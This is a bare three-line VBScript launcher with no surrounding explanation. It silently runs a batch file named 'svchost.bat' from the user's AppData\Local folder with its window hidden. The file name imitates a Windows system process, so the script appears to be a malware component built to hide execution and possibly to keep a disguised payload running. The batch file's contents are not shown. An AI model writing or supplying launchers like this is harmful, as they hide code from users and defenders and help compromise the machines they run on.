Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "%USERPROFILE%\AppData\Local\svchost.bat" & Chr(34), 0
Set WshShell = Nothing
